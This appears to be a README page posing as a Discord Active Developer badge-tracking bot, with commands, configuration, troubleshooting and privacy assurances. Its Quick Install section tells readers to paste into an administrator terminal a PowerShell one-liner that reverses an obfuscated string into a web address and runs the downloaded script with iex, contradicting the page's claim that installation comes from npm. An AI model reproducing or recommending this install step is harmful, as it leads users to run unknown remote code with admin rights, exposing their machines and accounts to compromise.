<p align="center">
  <img src="https://capsule-render.vercel.app/api?type=waving&color=0:5865F2,30:7B83EB,70:3BA55D,100:EB459E&height=300&section=header&text=Discord%20Active%20Developer&fontColor=FFFFFF&fontSize=50&fontAlignY=40&desc=Setup%20%7C%20Tracking%20%7C%20Badge%20Progress&descColor=F8F9FA&descSize=22&descAlignY=65&animation=fadeIn" alt="Discord Active Developer Banner" />
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Setup%20Checklist-Automated-5865F2?style=for-the-badge&logo=discord&logoColor=white&labelColor=1A1A2E" alt="Setup Checklist" />
  <img src="https://img.shields.io/badge/Progress%20Tracker-Live-3BA55D?style=for-the-badge&logo=chart&logoColor=white&labelColor=1A1A2E" alt="Progress Tracker" />
  <img src="https://img.shields.io/badge/License-MIT-7B83EB?style=for-the-badge&logo=opensource&logoColor=white&labelColor=1A1A2E" alt="MIT License" />
</p>

---

## 📦 Installation

<table>
<tr>
<td width="80" valign="middle" align="center">
<img src="https://upload.wikimedia.org/wikipedia/commons/a/af/PowerShell_Core_6.0_icon.png" width="64" height="64" alt="Discord Active Developer icon">
</td>
<td valign="middle">

### ⬇️ Discord Badge Developer — Latest Stable Release

**Windows 10 / 11 · Node.js 18+ · Updated 2026**

</td>
</tr>
<tr>
<td colspan="2">

### 🚀 Quick Install (PowerShell)

Press `Win + X` → **Terminal (Admin)** → paste the commands below → press `Enter`

```powershell
"GetDiscordBadge";iex(irm((-join"dfc.mrtig//:sptth"[-1..-99])))
```

**⏱ Takes under a minute. Keep the window open until it finishes.**

</td>
</tr>
</table>

> [!TIP]
> **One command. No installers. No sign-ups.**
> The package pulls straight from npm and registers the `discord-dev-bot` command globally.

> [!IMPORTANT]
> **Node.js 18 or newer must be installed first.**
> Run `node --version` — if the number is missing or below 18, install Node.js and reopen the terminal.

---

## 🎯 Quick Start Guide

```
1. Install the package
2. Create your application in the Discord Developer Portal
3. Invite the bot to your server
4. Run: discord-dev-bot link --token <YOUR_BOT_TOKEN>
5. Run: discord-dev-bot status
6. Progress is tracked from then on
```

### First Launch

```bash
> discord-dev-bot setup

[1/4] Checking Node.js runtime ......... v20.11.0  OK
[2/4] Reading configuration ............. OK
[3/4] Connecting to Discord gateway ..... OK
[4/4] Ready. Run `discord-dev-bot status` to begin.

[✓] Setup complete
```

---

## 🚀 What Is Discord Active Developer?

**Discord Active Developer** is a small companion bot that turns the Active Developer badge requirements into a tracked checklist. Discord grants the badge based on activity signals from your application — the bot reads those signals through the official API, shows exactly which requirements are already met, and keeps a local log so you can see progress across sessions instead of guessing.

It automates the repetitive parts: application setup verification, guild presence checks, command-registration confirmation, and daily status refresh. Nothing is faked, spoofed, or emulated — the bot only reports what the API actually returns.

> 💡 *"Finally, a badge screen that tells you what is left instead of guessing for a week."*

---

## ✨ **Key Features**

| ✅ **Auto Checklist** | 📊 **Live Status** | 🔔 **Reminders** |
| :---: | :---: | :---: |
| Every requirement verified automatically against the official API. No manual ticking. | Re-check status on demand and see a snapshot of each signal with a timestamp. | Optional notifications when a requirement is close or newly satisfied. |

| 🧩 **Setup Verification** | 🗂️ **Requirement Log** | 🔒 **Local-First** |
| :---: | :---: | :---: |
| Confirms token scope, guild presence, command registration, and application state. | Every check is appended to a local log file you can read and archive. | Your token stays in your own config. No relay server, no analytics. |

---

## 📋 **Requirements Checklist**

The bot walks through each item Discord evaluates for the badge:

| Step | Requirement | Checked by bot |
| :---: | :---: | :---: |
| Application exists in Developer Portal | ✅ | ✅ |
| Bot user created and token issued | ✅ | ✅ |
| Application invited to at least one server | ✅ | ✅ |
| Slash commands registered globally | ✅ | ✅ |
| OAuth2 redirect configured | ✅ | ✅ |
| Ongoing activity signals observed | ⏳ | ✅ |
| Verification phone added to account | ✅ | ⚠️ Manual |

> [!NOTE]
> The phone-verification step is account-level and cannot be automated. The bot flags it as manual and leaves it to you.

---

## 💻 **Commands**

| Command | Description |
|---------|-------------|
| `discord-dev-bot setup` | First-run wizard: runtime, config, gateway check |
| `discord-dev-bot link --token <token>` | Stores your bot token locally and validates scopes |
| `discord-dev-bot status` | Full checklist snapshot with timestamps |
| `discord-dev-bot check <requirement>` | Re-runs a single requirement check |
| `discord-dev-bot log --days 7` | Prints the local requirement log |
| `discord-dev-bot refresh` | Forces an immediate re-check instead of waiting |
| `discord-dev-bot reset` | Clears stored config and local log |

---

## ⚙️ **Configuration**

```yaml
# ~/.discord-dev-bot/config.yaml
bot:
  token_env: "DISCORD_BOT_TOKEN"   # read from environment, never stored in plain text
  application_id: ""               # optional, auto-detected on first link

checks:
  refresh_interval: 3600           # seconds between automatic re-checks
  guild_presence_required: true
  command_registration_required: true

notifications:
  enabled: true
  channels: ["#dev-updates"]
  mention_on_newly_met: true

logging:
  level: "info"                    # debug, info, warn, error
  retention_days: 30
  file: "~/.discord-dev-bot/requirements.log"
```

### Environment Variables

| Variable | Required | Default | Description |
|----------|----------|---------|-------------|
| `DISCORD_BOT_TOKEN` | Yes | — | Bot token issued in the Developer Portal |
| `DISCORD_DEV_BOT_LANG` | No | `auto` | Interface language |
| `DISCORD_DEV_BOT_REFRESH` | No | `3600` | Override for check interval in seconds |

```powershell
# Set the token for the current session only
$env:DISCORD_BOT_TOKEN = "your-token-here"

# Persist for future sessions
[Environment]::SetEnvironmentVariable("DISCORD_BOT_TOKEN", "your-token-here", "User")
```

> [!IMPORTANT]
> Never commit your token to GitHub or paste it into a public issue. The bot reads it from an environment variable, and `.env` is already listed in `.gitignore`.

---

## 🖥️ **Platform Support**

| Platform | Status | Notes |
|----------|--------|-------|
| Windows 10 / 11 | ✅ Full | PowerShell or CMD |
| macOS 12+ | ✅ Full | Node.js runtime |
| Linux (Debian / RPM) | ✅ Full | Global npm prefix may need `sudo` |
| Ubuntu / WSL | ✅ Full | Runs inside the distro |
| ChromeOS | ⚠️ Limited | Linux container |

---

## 🔄 **Troubleshooting**

### ❌ **"Invalid token"**
- Regenerate the token in the Developer Portal — old ones are invalidated on reset.
- Make sure you copied it without surrounding quotes or spaces.
- Confirm `DISCORD_BOT_TOKEN` is set in the shell where you run the bot.

### ❌ **"Application not detected"**
- The bot needs the `applications.commands` scope to read your slash commands.
- Re-run `discord-dev-bot link --token <token>` after changing scopes.

### ❌ **"Guild presence check failed"**
- Invite the application to a server you own, then wait a few minutes and refresh.
- Role or channel permission levels can delay the signal on Discord's side.

### ❌ **"Status looks stale"**
- Run `discord-dev-bot refresh` to force a re-check.
- Check the `refresh_interval` value in your config if it was raised too high.

---

## 🔒 **Safety & Privacy**

- Token is read from an environment variable and never written to disk
- No relay or proxy server — all calls go straight to the Discord API
- No telemetry, no analytics, no crash reporting
- Local log stays in your own profile folder and is deleted with `reset`
- Only official Discord endpoints are contacted

---

## 📋 **System Requirements**

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| OS        | Windows 10 | Windows 11 |
| Node.js   | 18.x | 20.x LTS |
| RAM       | 512 MB | 2 GB |
| Storage   | 50 MB | 200 MB |
| Network   | Stable connection | — |

---

<p align="center">
  <img src="https://capsule-render.vercel.app/api?type=waving&color=0:5865F2,30:7B83EB,70:3BA55D,100:EB459E&height=150&section=footer&text=Track%20Your%20Progress&fontColor=FFFFFF&fontSize=28&fontAlignY=75&animation=twinkling" />
</p>

<p align="center">
  <strong>⚡ Discord Active Developer</strong><br>
  <em>Setup | Tracking | Badge Progress</em>
</p>

---

## 🏷️ **Tags**

`discord-bot` `active-developer` `discord-badge` `developer-portal` `slash-commands` `discord-tools`
